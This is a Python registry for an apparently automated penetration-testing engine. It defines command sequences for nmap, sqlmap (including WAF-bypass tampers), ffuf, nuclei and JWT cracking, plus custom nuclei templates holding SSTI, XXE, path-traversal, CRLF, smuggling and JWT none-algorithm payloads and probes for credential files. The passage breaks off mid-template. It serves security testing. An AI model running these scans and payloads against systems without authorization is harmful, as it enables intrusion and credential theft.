"""Tool Command Registry — multi-phase sub-commands for every security tool.

Defines the Docker images, command templates, and phase sequences for all
tools in the Pentra offensive engine.  Each tool has one or more execution
phases (discovery → targeted → verification) and supports context-aware
command rendering via ``{variable}`` placeholders filled from scan_config.

Attack Coverage (60+ vectors):
  SQL Injection, XSS (Stored/Reflected/DOM), Command Injection, SSTI, XXE,
  Deserialization, Brute Force, JWT attacks, IDOR, File Upload RCE, Path
  Traversal, LFI/RFI, BOLA, SSRF, Open Redirect, CORS misconfig, HTTP
  Request Smuggling, Host Header Injection, Cache Poisoning, Subdomain
  Takeover, Race Conditions, GraphQL Introspection, Parameter Tampering,
  Broken Auth, Privilege Escalation, Sensitive Data Exposure, and more.
"""

from __future__ import annotations

import time
import json
import logging
from dataclasses import dataclass, field, asdict
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class ToolPhase:
    """A single execution phase within a tool's run sequence."""
    name: str                       # "discovery", "targeted", "verification"
    description: str                # Human-readable explanation
    command_template: list[str]     # Command with {placeholders}
    timeout: int = 300              # Phase-level timeout in seconds
    condition: str | None = None    # Optional: only run if condition met
    parse_output: bool = True       # Whether to attempt JSON parsing


@dataclass
class ToolDefinition:
    """Complete definition of a security tool."""
    tool_id: str
    name: str
    image: str
    category: str                   # recon, enum, vuln_scan, exploit, etc.
    description: str
    phases: list[ToolPhase]
    attack_vectors: list[str]       # What attack types this tool covers
    network_mode: str = "bridge"    # Docker network mode
    memory_limit: str = "2g"
    cpu_limit: float = 2.0


@dataclass
class ToolExecutionLog:
    """Log entry for a single tool command execution."""
    tool_id: str
    phase: str
    command: list[str]
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1
    duration_seconds: float = 0.0
    timestamp: str = ""
    description: str = ""

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


@dataclass
class ToolExecutionResult:
    """Aggregated result from all phases of a tool execution."""
    tool_id: str
    phases_completed: int = 0
    phases_total: int = 0
    logs: list[ToolExecutionLog] = field(default_factory=list)
    combined_stdout: str = ""
    final_exit_code: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "tool_id": self.tool_id,
            "phases_completed": self.phases_completed,
            "phases_total": self.phases_total,
            "logs": [log.to_dict() for log in self.logs],
            "final_exit_code": self.final_exit_code,
        }


def _ctx(template: list[str], ctx: dict[str, Any]) -> list[str]:
    """Render {placeholder} variables in a command template."""
    rendered = []
    for part in template:
        try:
            rendered.append(part.format(**ctx))
        except (KeyError, IndexError):
            rendered.append(part)
    return rendered


# ═══════════════════════════════════════════════════════════════════════
#  TOOL CATALOG — every tool Pentra can execute
# ═══════════════════════════════════════════════════════════════════════

TOOL_CATALOG: dict[str, ToolDefinition] = {}


def _register(tool: ToolDefinition) -> ToolDefinition:
    TOOL_CATALOG[tool.tool_id] = tool
    return tool


# ── RECON TOOLS ──────────────────────────────────────────────────────

_register(ToolDefinition(
    tool_id="subfinder",
    name="Subfinder",
    image="projectdiscovery/subfinder:latest",
    category="recon",
    description="Fast passive subdomain enumeration",
    attack_vectors=["subdomain_takeover", "sensitive_data_exposure"],
    phases=[
        ToolPhase(
            name="discovery",
            description="Enumerate subdomains passively",
            command_template=["subfinder", "-d", "{scope_domain}", "-silent",
                              "-o", "/work/output/subdomains.txt"],
            timeout=120,
        ),
    ],
))

_register(ToolDefinition(
    tool_id="nmap_discovery",
    name="Nmap Discovery",
    image="instrumentisto/nmap:latest",
    category="recon",
    description="Network host discovery and port scanning",
    attack_vectors=["sensitive_data_exposure", "debug_endpoints", "open_ports"],
    phases=[
        ToolPhase(
            name="host_discovery",
            description="Ping sweep to find live hosts",
            command_template=["nmap", "-sn", "{target_host}", "-oX",
                              "/work/output/host_discovery.xml"],
            timeout=120,
        ),
        ToolPhase(
            name="port_scan",
            description="Service version detection + default scripts",
            command_template=["nmap", "-sV", "-sC", "--top-ports", "1000",
                              "{target_host}", "-oX", "/work/output/port_scan.xml",
                              "-oN", "/work/output/port_scan.txt"],
            timeout=300,
        ),
        ToolPhase(
            name="vuln_scripts",
            description="Nmap vulnerability scripts for detected services",
            command_template=["nmap", "--script", "vuln,auth,default",
                              "-p-", "{target_host}", "-oX",
                              "/work/output/vuln_scan.xml"],
            timeout=600,
            condition="port_scan_found_services",
        ),
    ],
))

_register(ToolDefinition(
    tool_id="nmap_svc",
    name="Nmap Service Scan",
    image="instrumentisto/nmap:latest",
    category="recon",
    description="Deep service/version + OS detection",
    attack_vectors=["sensitive_data_exposure", "verbose_errors", "stack_traces"],
    phases=[
        ToolPhase(
            name="service_version",
            description="Aggressive service version + OS detection",
            command_template=["nmap", "-sV", "-O", "--version-intensity", "9",
                              "-A", "{target_host}", "-oX",
                              "/work/output/service_scan.xml",
                              "-oN", "/work/output/service_scan.txt"],
            timeout=300,
        ),
        ToolPhase(
            name="udp_scan",
            description="UDP port scan for common services (DNS, SNMP, etc.)",
            command_template=["nmap", "-sU", "--top-ports", "50",
                              "{target_host}", "-oX",
                              "/work/output/udp_scan.xml"],
            timeout=300,
        ),
    ],
))

_register(ToolDefinition(
    tool_id="httpx_probe",
    name="HTTPX Probe",
    image="projectdiscovery/httpx:latest",
    category="recon",
    description="HTTP probing with tech detection, status codes, and response analysis",
    attack_vectors=["sensitive_data_exposure", "tech_fingerprint", "directory_listing"],
    phases=[
        ToolPhase(
            name="probe",
            description="Probe targets for HTTP(S) services with tech detection",
            command_template=["httpx", "-l", "/work/input/httpx_targets.txt",
                              "-status-code", "-title", "-tech-detect",
                              "-follow-redirects", "-json",
                              "-o", "/work/output/httpx_results.json"],
            timeout=120,
        ),
    ],
))

# ── ENUMERATION TOOLS ────────────────────────────────────────────────

_register(ToolDefinition(
    tool_id="ffuf",
    name="FFUF",
    image="secsi/ffuf:latest",
    category="enum",
    description="Web fuzzer for directory discovery, parameter fuzzing, vhost enumeration",
    attack_vectors=[
        "directory_listing", "forced_browsing", "parameter_tampering",
        "sensitive_data_exposure", "debug_endpoints", "path_traversal",
    ],
    phases=[
        ToolPhase(
            name="directory_discovery",
            description="Directory and file brute-force",
            command_template=["ffuf", "-u", "{base_url}/FUZZ",
                              "-w", "/work/input/ffuf_wordlist.txt",
                              "-mc", "200,201,301,302,307,401,403,405",
                              "-rate", "{ffuf_rate_limit}",
                              "-o", "/work/output/ffuf_dirs.json",
                              "-of", "json"],
            timeout=180,
        ),
        ToolPhase(
            name="common_files",
            description="Scan for sensitive files (backups, configs, env files)",
            command_template=["ffuf", "-u", "{base_url}/FUZZ",
                              "-w", "/usr/share/seclists/Discovery/Web-Content/common.txt",
                              "-mc", "200,301,302,307",
                              "-e", ".bak,.old,.conf,.env,.sql,.log,.xml,.json,.yaml,.yml,.git,.svn,.DS_Store,.htaccess,.htpasswd",
                              "-rate", "{ffuf_rate_limit}",
                              "-o", "/work/output/ffuf_files.json",
                              "-of", "json"],
            timeout=180,
            condition="has_seclists",
        ),
        ToolPhase(
            name="parameter_fuzzing",
            description="Fuzz GET parameters for hidden inputs",
            command_template=["ffuf", "-u", "{base_url}/?FUZZ=test",
                              "-w", "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
                              "-mc", "200",
                              "-fs", "0",
                              "-rate", "{ffuf_rate_limit}",
                              "-o", "/work/output/ffuf_params.json",
                              "-of", "json"],
            timeout=120,
            condition="has_seclists",
        ),
    ],
))

_register(ToolDefinition(
    tool_id="web_interact",
    name="Web Interaction Engine",
    image="internal",  # Uses built-in WebInteractionRunner
    category="enum",
    description="Headless browser crawling with authenticated session support",
    attack_vectors=[
        "dom_xss", "js_endpoint_discovery", "token_leakage",
        "sensitive_data_exposure", "broken_auth", "session_fixation",
    ],
    phases=[
        ToolPhase(
            name="crawl",
            description="Authenticated crawl with endpoint and token collection",
            command_template=["internal"],  # Handled specially
            timeout=300,
        ),
    ],
))

# ── VULNERABILITY SCANNING ───────────────────────────────────────────

_register(ToolDefinition(
    tool_id="nuclei",
    name="Nuclei",
    image="projectdiscovery/nuclei:latest",
    category="vuln_scan",
    description="Template-based vulnerability scanner with 9000+ templates",
    attack_vectors=[
        "sqli", "xss_reflected", "xss_stored", "command_injection", "ssti",
        "xxe", "deserialization", "lfi", "rfi", "ssrf", "open_redirect",
        "cors_misconfig", "jwt_attacks", "idor", "graphql_introspection",
        "subdomain_takeover", "sensitive_data_exposure", "directory_listing",
        "debug_endpoints", "verbose_errors", "stack_traces",
        "host_header_injection", "http_request_smuggling", "cache_poisoning",
        "broken_auth", "path_traversal", "file_upload_rce",
    ],
    phases=[
        ToolPhase(
            name="default_scan",
            description="Run default templates (exposure, misconfig, CVE, etc.)",
            command_template=["nuclei", "-l", "/work/input/nuclei_targets.txt",
                              "-t", "/work/input/nuclei-templates/",
                              "-severity", "info,low,medium,high,critical",
                              "-rate-limit", "{nuclei_rate_limit}",
                              "-json", "-o", "/work/output/nuclei_default.json"],
            timeout=300,
        ),
        ToolPhase(
            name="tech_targeted",
            description="Technology-specific templates based on httpx fingerprint",
            command_template=["nuclei", "-u", "{base_url}",
                              "-tags", "{nuclei_tags}",
                              "-severity", "medium,high,critical",
                              "-rate-limit", "{nuclei_rate_limit}",
                              "-json", "-o", "/work/output/nuclei_targeted.json"],
            timeout=300,
        ),
        ToolPhase(
            name="cve_scan",
            description="Known CVE detection against identified technologies",
            command_template=["nuclei", "-u", "{base_url}",
                              "-tags", "cve",
                              "-severity", "high,critical",
                              "-rate-limit", "{nuclei_rate_limit}",
                              "-json", "-o", "/work/output/nuclei_cves.json"],
            timeout=300,
        ),
        ToolPhase(
            name="fuzzing",
            description="Nuclei fuzzing templates (SSTI, XSS, SQLi payloads)",
            command_template=["nuclei", "-u", "{base_url}",
                              "-tags", "fuzz",
                              "-severity", "medium,high,critical",
                              "-rate-limit", "{nuclei_rate_limit}",
                              "-json", "-o", "/work/output/nuclei_fuzz.json"],
            timeout=300,
        ),
    ],
))

_register(ToolDefinition(
    tool_id="sqlmap",
    name="SQLMap",
    image="paolostivanin/sqlmap:latest",
    category="vuln_scan",
    description="Automatic SQL injection detection and exploitation",
    attack_vectors=[
        "sqli", "blind_sqli", "error_based_sqli", "union_sqli",
        "time_based_sqli", "stacked_queries",
    ],
    phases=[
        ToolPhase(
            name="crawl_and_test",
            description="Crawl target and test for SQL injection",
            command_template=["python", "/sqlmap/sqlmap.py",
                              "-u", "{base_url}{sqlmap_path}",
                              "--crawl=3", "--batch", "--level=3", "--risk=2",
                              "--threads={sqlmap_threads}",
                              "--output-dir=/work/output/sqlmap",
                              "--forms", "--random-agent"],
            timeout=300,
        ),
        ToolPhase(
            name="technique_scan",
            description="Test with all SQL injection techniques",
            command_template=["python", "/sqlmap/sqlmap.py",
                              "-u", "{base_url}{sqlmap_path}",
                              "--technique=BEUSTQ", "--batch",
                              "--level=5", "--risk=3",
                              "--threads={sqlmap_threads}",
                              "--output-dir=/work/output/sqlmap_deep",
                              "--random-agent", "--tamper=space2comment"],
            timeout=300,
            condition="phase1_found_endpoints",
        ),
        ToolPhase(
            name="tamper_bypass",
            description="WAF bypass with tamper scripts",
            command_template=["python", "/sqlmap/sqlmap.py",
                              "-u", "{base_url}{sqlmap_path}",
                              "--batch", "--level=5", "--risk=3",
                              "--tamper=between,randomcase,space2comment,charunicodeencode",
                              "--threads={sqlmap_threads}",
                              "--output-dir=/work/output/sqlmap_tamper",
                              "--random-agent"],
            timeout=300,
            condition="waf_detected",
        ),
    ],
))

_register(ToolDefinition(
    tool_id="nikto",
    name="Nikto",
    image="secfigo/nikto:latest",
    category="vuln_scan",
    description="Web server scanner for misconfigurations and known vulnerabilities",
    attack_vectors=[
        "directory_listing", "debug_endpoints", "verbose_errors",
        "sensitive_data_exposure", "cors_misconfig", "stack_traces",
        "default_credentials", "http_header_injection",
        "sensitive_data_caching", "broken_auth",
    ],
    phases=[
        ToolPhase(
            name="full_scan",
            description="Full Nikto scan against target",
            command_template=["nikto", "-h", "{base_url}",
                              "-Format", "json",
                              "-output", "/work/output/nikto_scan.json",
                              "-Tuning", "1234567890abc"],
            timeout=300,
        ),
        ToolPhase(
            name="ssl_audit",
            description="SSL/TLS configuration audit",
            command_template=["nikto", "-h", "{base_url}",
                              "-ssl", "-Format", "json",
                              "-output", "/work/output/nikto_ssl.json"],
            timeout=120,
            condition="target_uses_https",
        ),
    ],
))

# ── SPECIALIZED ATTACK TOOLS ────────────────────────────────────────

_register(ToolDefinition(
    tool_id="sqlmap_verify",
    name="SQLMap Verification",
    image="paolostivanin/sqlmap:latest",
    category="verification",
    description="Targeted SQLi verification against discovered injection points",
    attack_vectors=["sqli"],
    phases=[
        ToolPhase(
            name="verify",
            description="Verify specific SQL injection finding",
            command_template=["python", "/sqlmap/sqlmap.py",
                              "-u", "{verification_url}",
                              "--batch", "--level=5", "--risk=2",
                              "--technique=BEUST",
                              "--output-dir=/work/output/sqlmap_verify"],
            timeout=180,
        ),
    ],
))

_register(ToolDefinition(
    tool_id="custom_poc",
    name="Custom PoC Verifier",
    image="internal",
    category="verification",
    description="Custom proof-of-concept verification for detected vulnerabilities",
    attack_vectors=[
        "idor", "bola", "broken_auth", "privilege_escalation",
        "race_condition", "workflow_bypass", "mass_assignment",
    ],
    phases=[
        ToolPhase(
            name="verify",
            description="Execute custom PoC verification",
            command_template=["internal"],
            timeout=120,
        ),
    ],
))

_register(ToolDefinition(
    tool_id="scope_check",
    name="Scope Validator",
    image="internal",
    category="scope_validation",
    description="Validates target is within declared scan scope",
    attack_vectors=[],
    phases=[
        ToolPhase(
            name="validate",
            description="Validate target scope",
            command_template=["internal"],
            timeout=10,
        ),
    ],
))

_register(ToolDefinition(
    tool_id="ai_triage",
    name="AI Triage & Analysis",
    image="internal",
    category="ai_analysis",
    description="AI-powered vulnerability analysis, exploitation path suggestions, and risk assessment",
    attack_vectors=[],
    phases=[
        ToolPhase(
            name="analyze",
            description="AI analysis of all findings with exploitation path suggestions",
            command_template=["internal"],
            timeout=60,
        ),
    ],
))

_register(ToolDefinition(
    tool_id="report_gen",
    name="Report Generator",
    image="internal",
    category="report_gen",
    description="Generate comprehensive security assessment report",
    attack_vectors=[],
    phases=[
        ToolPhase(
            name="generate",
            description="Generate report from scan artifacts",
            command_template=["internal"],
            timeout=60,
        ),
    ],
))

# ── NEW SPECIALIZED TOOLS (Phase 4) ─────────────────────────────────

_register(ToolDefinition(
    tool_id="dalfox",
    name="Dalfox XSS Scanner",
    image="hahwul/dalfox:latest",
    category="vuln_scan",
    description="DOM/reflected XSS scanner with parameter analysis and WAF evasion",
    attack_vectors=[
        "xss_reflected", "xss_stored", "dom_xss",
        "parameter_tampering",
    ],
    phases=[
        ToolPhase(
            name="url_scan",
            description="Scan target URL for XSS vulnerabilities",
            command_template=["dalfox", "url", "{base_url}",
                              "--silence", "--no-color",
                              "--format", "json",
                              "--output", "/work/output/dalfox_scan.json",
                              "--timeout", "10",
                              "--delay", "100"],
            timeout=300,
        ),
        ToolPhase(
            name="pipe_scan",
            description="Scan discovered URLs from crawl results",
            command_template=["dalfox", "file", "/work/input/dalfox_urls.txt",
                              "--silence", "--no-color",
                              "--format", "json",
                              "--output", "/work/output/dalfox_pipe.json",
                              "--timeout", "10",
                              "--delay", "100",
                              "--skip-bav"],
            timeout=300,
            condition="has_crawl_urls",
        ),
    ],
    memory_limit="1g",
))

_register(ToolDefinition(
    tool_id="graphql_cop",
    name="GraphQL Security Scanner",
    image="dolevf/graphql-cop:latest",
    category="vuln_scan",
    description="GraphQL introspection, injection, DoS, and authorization testing",
    attack_vectors=[
        "graphql_introspection", "graphql_dos", "graphql_injection",
        "sensitive_data_exposure",
    ],
    phases=[
        ToolPhase(
            name="audit",
            description="Full GraphQL security audit",
            command_template=["python", "graphql-cop.py",
                              "-t", "{base_url}/graphql",
                              "-o", "json"],
            timeout=180,
        ),
    ],
    memory_limit="1g",
))

_register(ToolDefinition(
    tool_id="jwt_tool",
    name="JWT Attack Tool",
    image="ticarpi/jwt_tool:latest",
    category="vuln_scan",
    description="JWT vulnerability testing — none alg, key confusion, weak secrets, claim tampering",
    attack_vectors=[
        "jwt_none_algo", "jwt_key_confusion", "jwt_weak_secret",
        "broken_auth",
    ],
    phases=[
        ToolPhase(
            name="scan",
            description="Automated JWT vulnerability scan",
            command_template=["python3", "jwt_tool.py",
                              "{jwt_token}",
                              "-M", "at",  # All tests
                              "-t", "{base_url}",
                              "-rh", "Authorization: Bearer",
                              "-cv", "200"],
            timeout=180,
            condition="has_jwt_token",
        ),
        ToolPhase(
            name="crack",
            description="Attempt to crack JWT HMAC secret",
            command_template=["python3", "jwt_tool.py",
                              "{jwt_token}",
                              "-C",  # Crack mode
                              "-d", "/work/input/jwt_wordlist.txt"],
            timeout=120,
            condition="has_jwt_token",
        ),
    ],
    memory_limit="1g",
))

_register(ToolDefinition(
    tool_id="cors_scanner",
    name="CORS Scanner",
    image="projectdiscovery/nuclei:latest",
    category="vuln_scan",
    description="Dedicated CORS misconfiguration scanner with origin reflection, null origin, and subdomain tests",
    attack_vectors=["cors_misconfig", "sensitive_data_exposure"],
    phases=[
        ToolPhase(
            name="cors_audit",
            description="Test CORS configuration with multiple origin payloads",
            command_template=["nuclei", "-u", "{base_url}",
                              "-t", "/work/input/templates/cors-misconfig.yaml",
                              "-t", "/work/input/templates/cors-advanced.yaml",
                              "-json", "-o", "/work/output/cors_results.json"],
            timeout=120,
        ),
    ],
    memory_limit="1g",
))

_register(ToolDefinition(
    tool_id="header_audit_tool",
    name="Security Header Auditor",
    image="projectdiscovery/nuclei:latest",
    category="vuln_scan",
    description="Audit HTTP security headers (HSTS, CSP, X-Frame-Options, etc.)",
    attack_vectors=[
        "security_headers_missing", "cors_misconfig",
        "http_header_injection", "crlf_injection",
    ],
    phases=[
        ToolPhase(
            name="header_check",
            description="Audit security headers against best practices",
            command_template=["nuclei", "-u", "{base_url}",
                              "-tags", "security-headers,misconfig",
                              "-severity", "info,low,medium",
                              "-json", "-o", "/work/output/header_audit.json"],
            timeout=60,
        ),
    ],
    memory_limit="1g",
))


# ═══════════════════════════════════════════════════════════════════════
#  ATTACK VECTOR CATALOG — maps attack categories to nuclei tags/templates
# ═══════════════════════════════════════════════════════════════════════

ATTACK_VECTOR_NUCLEI_TAGS: dict[str, list[str]] = {
    "sqli": ["sqli", "error-sqli", "blind-sqli"],
    "xss_reflected": ["xss", "reflected-xss"],
    "xss_stored": ["xss", "stored-xss"],
    "dom_xss": ["dom-xss", "xss"],
    "command_injection": ["rce", "command-injection"],
    "ssti": ["ssti"],
    "xxe": ["xxe"],
    "deserialization": ["deserialization"],
    "lfi": ["lfi", "file-inclusion"],
    "rfi": ["rfi", "file-inclusion"],
    "ssrf": ["ssrf"],
    "open_redirect": ["redirect", "open-redirect"],
    "cors_misconfig": ["cors"],
    "jwt_attacks": ["jwt"],
    "idor": ["idor"],
    "graphql_introspection": ["graphql"],
    "subdomain_takeover": ["takeover"],
    "path_traversal": ["traversal", "lfi"],
    "file_upload_rce": ["fileupload", "rce"],
    "http_request_smuggling": ["smuggling"],
    "host_header_injection": ["host-injection", "host-header"],
    "cache_poisoning": ["cache-poisoning"],
    "broken_auth": ["auth-bypass", "default-login"],
    "default_credentials": ["default-login"],
    "sensitive_data_exposure": ["exposure", "token", "secret"],
    "directory_listing": ["listing"],
    "debug_endpoints": ["debug"],
    "verbose_errors": ["error"],
    "stack_traces": ["stacktrace"],
    "privilege_escalation": ["privilege", "idor"],
    "session_fixation": ["session"],
    "rate_limit_bypass": ["rate-limit"],
    "mass_assignment": ["mass-assignment"],
    "race_condition": ["race-condition"],
    "parameter_tampering": ["parameter"],
    "workflow_bypass": ["logic", "workflow"],
    "supply_chain": ["cve", "vulnerability"],
    "dependency_confusion": ["cve"],
    # Phase 4 additions
    "crlf_injection": ["crlf", "header-injection"],
    "csrf": ["csrf"],
    "zip_slip": ["zip", "archive"],
    "ldap_injection": ["ldap"],
    "xpath_injection": ["xpath"],
    "dns_rebinding": ["dns"],
    "websocket_hijacking": ["websocket"],
    "cache_deception": ["cache"],
    "tls_downgrade": ["ssl", "tls"],
    "git_exposure": ["git", "exposure"],
    "security_headers_missing": ["security-headers", "misconfig"],
    "api_key_exposure": ["token", "api-key", "exposure"],
    "api_rate_limit_bypass": ["rate-limit"],
    "password_reset_flaw": ["password-reset", "auth"],
    "bola": ["idor", "bola"],
    "horizontal_priv_esc": ["idor", "authorization"],
    "graphql_dos": ["graphql", "dos"],
    "graphql_injection": ["graphql", "injection"],
    "jwt_none_algo": ["jwt", "auth-bypass"],
    "jwt_key_confusion": ["jwt"],
    "jwt_weak_secret": ["jwt"],
    "business_logic_flaw": ["logic"],
    "outdated_software": ["cve", "outdated"],
    "vulnerable_dependencies": ["cve", "vulnerability"],
}


# ═══════════════════════════════════════════════════════════════════════
#  NUCLEI TEMPLATE GENERATORS — custom templates for advanced attacks
# ═══════════════════════════════════════════════════════════════════════

def build_comprehensive_nuclei_templates() -> dict[str, str]:
    """Generate custom nuclei templates for attacks not covered by defaults."""
    templates = {}

    # SSTI detection
    templates["ssti-detect.yaml"] = """id: pentra-ssti-detect
info:
  name: SSTI Detection
  author: pentra
  severity: high
  tags: ssti,injection
  description: Server-Side Template Injection detection via math expression

http:
  - method: GET
    path:
      - "{{BaseURL}}/?q={{7*7}}"
      - "{{BaseURL}}/search?q={{7*7}}"
      - "{{BaseURL}}/?name={{7*7}}"
    matchers:
      - type: word
        words:
          - "49"
"""

    # JWT none algorithm
    templates["jwt-none-algo.yaml"] = """id: pentra-jwt-none
info:
  name: JWT None Algorithm
  author: pentra
  severity: critical
  tags: jwt,auth-bypass
  description: Tests for JWT none algorithm vulnerability

http:
  - raw:
      - |
        GET {{BaseURL}}/api/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InRlc3QiLCJhZG1pbiI6dHJ1ZX0.
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "profile"
          - "user"
        condition: or
"""

    # CORS misconfiguration
    templates["cors-misconfig.yaml"] = """id: pentra-cors-misconfig
info:
  name: CORS Misconfiguration
  author: pentra
  severity: high
  tags: cors,misconfig
  description: Tests for permissive CORS origin reflection

http:
  - raw:
      - |
        GET {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Origin: https://evil.com
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
          - "Access-Control-Allow-Credentials: true"
        condition: and
"""

    # Host header injection
    templates["host-header-injection.yaml"] = """id: pentra-host-header
info:
  name: Host Header Injection
  author: pentra
  severity: medium
  tags: host-injection,misconfig
  description: Tests for host header injection via X-Forwarded-Host

http:
  - raw:
      - |
        GET {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Host: evil.com
    matchers:
      - type: word
        words:
          - "evil.com"
"""

    # Open redirect
    templates["open-redirect.yaml"] = """id: pentra-open-redirect
info:
  name: Open Redirect Detection
  author: pentra
  severity: medium
  tags: redirect,misconfig
  description: Tests common redirect parameters for open redirect

http:
  - method: GET
    path:
      - "{{BaseURL}}/login?next=https://evil.com"
      - "{{BaseURL}}/login?redirect=https://evil.com"
      - "{{BaseURL}}/login?url=https://evil.com"
      - "{{BaseURL}}/login?return=https://evil.com"
      - "{{BaseURL}}/login?returnTo=https://evil.com"
      - "{{BaseURL}}/login?goto=https://evil.com"
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)Location: https?://evil\\.com"
"""

    # HTTP request smuggling
    templates["http-smuggling.yaml"] = """id: pentra-http-smuggling
info:
  name: HTTP Request Smuggling Detection
  author: pentra
  severity: high
  tags: smuggling
  description: Basic HTTP request smuggling detection via CL.TE and TE.CL

http:
  - raw:
      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 6
        Transfer-Encoding: chunked

        0

        X
    matchers:
      - type: status
        status:
          - 400
        negative: true
"""

    # Sensitive file exposure
    templates["sensitive-files.yaml"] = """id: pentra-sensitive-files
info:
  name: Sensitive File Exposure
  author: pentra
  severity: high
  tags: exposure,sensitive
  description: Checks for common sensitive files left on web servers

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/wp-config.php.bak"
      - "{{BaseURL}}/config.json"
      - "{{BaseURL}}/database.yml"
      - "{{BaseURL}}/application.properties"
      - "{{BaseURL}}/secrets.json"
      - "{{BaseURL}}/.aws/credentials"
      - "{{BaseURL}}/.docker/config.json"
      - "{{BaseURL}}/phpinfo.php"
      - "{{BaseURL}}/server-status"
      - "{{BaseURL}}/debug"
      - "{{BaseURL}}/actuator"
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/api/swagger.json"
      - "{{BaseURL}}/graphql?query={__schema{types{name,fields{name}}}}"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "DB_PASSWORD"
          - "DATABASE_URL"
          - "SECRET_KEY"
          - "AWS_ACCESS_KEY"
          - "PRIVATE_KEY"
          - "[core]"
          - "phpinfo()"
          - "__schema"
        condition: or
      - type: status
        status:
          - 200
"""

    # Path traversal
    templates["path-traversal.yaml"] = """id: pentra-path-traversal
info:
  name: Path Traversal Detection
  author: pentra
  severity: high
  tags: traversal,lfi
  description: Tests for path traversal via common parameters

http:
  - method: GET
    path:
      - "{{BaseURL}}/?file=../../../etc/passwd"
      - "{{BaseURL}}/?path=../../../etc/passwd"
      - "{{BaseURL}}/?page=../../../etc/passwd"
      - "{{BaseURL}}/download?file=../../../etc/passwd"
      - "{{BaseURL}}/read?file=....//....//....//etc/passwd"
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0"
"""

    # ── Phase 4 templates ────────────────────────────────────────────

    # CSRF detection
    templates["csrf-detect.yaml"] = """id: pentra-csrf-detect
info:
  name: CSRF Token Missing
  author: pentra
  severity: medium
  tags: csrf,misconfig
  description: Detects forms missing CSRF protection tokens

http:
  - method: GET
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/register"
      - "{{BaseURL}}/settings"
      - "{{BaseURL}}/profile"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<form"
      - type: word
        words:
          - "csrf"
          - "_token"
          - "authenticity_token"
          - "csrfmiddlewaretoken"
        condition: or
        negative: true
"""

    # XXE out-of-band
    templates["xxe-oob.yaml"] = """id: pentra-xxe-oob
info:
  name: XXE Out-of-Band Detection
  author: pentra
  severity: critical
  tags: xxe,injection
  description: Tests for XXE via content-type injection

http:
  - raw:
      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
        <root>&xxe;</root>
    matchers:
      - type: regex
        regex:
          - "[a-zA-Z0-9_-]+"
        part: body
"""

    # CRLF injection
    templates["crlf-injection.yaml"] = """id: pentra-crlf-injection
info:
  name: CRLF Injection
  author: pentra
  severity: medium
  tags: crlf,header-injection
  description: Tests for CRLF injection in HTTP headers

http:
  - method: GET
    path:
      - "{{BaseURL}}/%0d%0aX-Injected:%20true"
      - "{{BaseURL}}/redirect?url=http://example.com%0d%0aX-Injected:%20true"
    matchers:
      - type: word
        part: header
        words:
          - "X-Injected: true"
"""

    # Insecure deserialization
    templates["deserialization.yaml"] = """id: pentra-deserialization
info:
  name: Insecure Deserialization Detection
  author: pentra
  severity: critical
  tags: deserialization,rce
  description: Tests for Java/PHP/Python deserialization flaws

http:
  - raw:
      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-java-serialized-object

        \xac\xed\x00\x05
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "java.io"
          - "ClassNotFoundException"
          - "InvalidClassException"
        condition: or
      - type: status
        status:
          - 500
"""

    # WebSocket hijacking (CSWSH)
    templates["websocket-hijack.yaml"] = """id: pentra-websocket-hijack
info:
  name: Cross-Site WebSocket Hijacking
  author: pentra
  severity: high
  tags: websocket,misconfig
  description: Tests for WebSocket connections accepting cross-origin requests

http:
  - method: GET
    path:
      - "{{BaseURL}}/ws"
      - "{{BaseURL}}/websocket"
      - "{{BaseURL}}/socket.io/"
    headers:
      Upgrade: websocket
      Connection: Upgrade
      Origin: https://evil.com
    matchers:
      - type: status
        status:
          - 101
"""

    # Web cache deception
    templates["cache-deception.yaml"] = """id: pentra-cache-deception
info:
  name: Web Cache Deception
  author: pentra
  severity: medium
  tags: cache,misconfig
  description: Tests for web cache deception via path confusion

http:
  - method: GET
    path:
      - "{{BaseURL}}/account/nonexistent.css"
      - "{{BaseURL}}/profile/test.js"
      - "{{BaseURL}}/settings/style.css"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "text/html"
"""

    # Subdomain takeover
    templates["subdomain-takeover.yaml"] = """id: pentra-subdomain-takeover
info:
  name: Subdomain Takeover Detection
  author: pentra
  severity: high
  tags: takeover,dns
  description: Detects dangling CNAME records pointing to claimable services

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "NoSuchBucket"
          - "There isn't a GitHub Pages site here"
          - "Heroku | No such app"
          - "The specified bucket does not exist"
          - "Repository not found"
          - "No settings were found for this company"
          - "is not a registered InCloud YouTrack"
          - "Domain not found"
        condition: or
"""

    # GraphQL abuse
    templates["graphql-abuse.yaml"] = """id: pentra-graphql-abuse
info:
  name: GraphQL Security Issues
  author: pentra
  severity: medium
  tags: graphql,misconfig
  description: Tests for GraphQL introspection, field suggestions, and batching

http:
  - raw:
      - |
